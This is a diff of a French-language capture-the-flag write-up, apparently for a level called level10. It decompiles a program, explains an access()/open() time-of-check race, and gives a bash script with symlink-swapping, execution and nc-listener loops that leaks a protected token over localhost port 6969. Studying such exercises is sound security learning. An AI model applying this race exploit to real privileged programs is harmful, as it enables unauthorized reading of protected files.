@@ -2,8 +2,7 @@
 
 ### Observations:
 
-##### ~/level10:
-Je decompile le programme accessible 
+##### Je decompile le programme accessible dans le dossier utilisateur:
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
@@ -74,24 +73,24 @@ char *addresse_ip
 ```
 
 ##### Fonctionnement
-Le programme verifie si le chemin_fichier est accessible par l'utilisteur a l'aide de la fonction access. \
+Le programme verifie si le chemin_fichier est accessible par l'utilisateur a l'aide de la fonction access. \
 Puis se connecte a un serveur avec addresse_ip pour par la suite ouvrir le fichier avec la fonction open.
 
 > Le serveur est heberge sur l'addresse ip '127.0.0.1' avec le port '6969'
 
 ##### Conclusions
-L'ordre d'execution des fonctions creer une fail qui nous permet de 
+L'ordre d'execution des fonctions cree une faille qui nous permet de 
 modifier le fichier pointant a la fin du chemin_fichier pendant la connection.
 Cette operation leurre la fonction open sur le fait que nous avons les \
 droits sur ce fichier du au fait que la fonction access retient les drois d'ouverture.
 
 ### Resolution:
-Je creer un script qui effectue trois operations distinctes en parrallele.
+Je cree un script qui effectue trois operations distinctes en parallele.
 
-La premiere consiste en une boucle qui creer un lien symbolique vers un fichier accessible par l'utilisateur \
+La premiere consiste en une boucle qui cree un lien symbolique vers un fichier accessible par l'utilisateur \
 pour ensuite le modifier pour pointer vers le fichier ou le token est stocke dans la racine HOME.
 
-La seconde est compose d'une boucle qui execute le programme '~/level10' tout en pointant sur le lien symbolique cree et modifie par la boucle de l'operation precedente.
+La seconde est composee d'une boucle qui execute le programme '~/level10' tout en pointant sur le lien symbolique cree et modifie par la boucle de l'operation precedente.
 
 La derniere est une simple boucle qui recupere les donnees circulant sur le port reseau 6969 et affiche le resultat quand ce n'est pas le contenu du fichier accessible (soit l'executable '~/level10').
 
@@ -111,17 +110,15 @@ link_breaker()
 		ln -nsf /home/user/level10/level10 /tmp/link
 		ln -nsf /home/user/level10/token /tmp/link
 	done
-	echo "link breaker done !"
 }
 
 listen_to_serv()
 {
 	while [ ! -f "/tmp/done" ];
 	do
-		TOK="$(nc -ln 6969)";
+		TOK="$(nc -ln 6969)"
 		[[ "$TOK" !=  *ELF* ]] && echo "$TOK" && touch /tmp/done
 	done
-	echo "listening done !"
 }
 
 exec_loop()
@@ -130,7 +127,6 @@ exec_loop()
 	do
 		/home/user/level10/level10 /tmp/link "127.0.0.1" >/dev/null
 	done
-	echo "exec done !"
 }
 
 exec_loop&
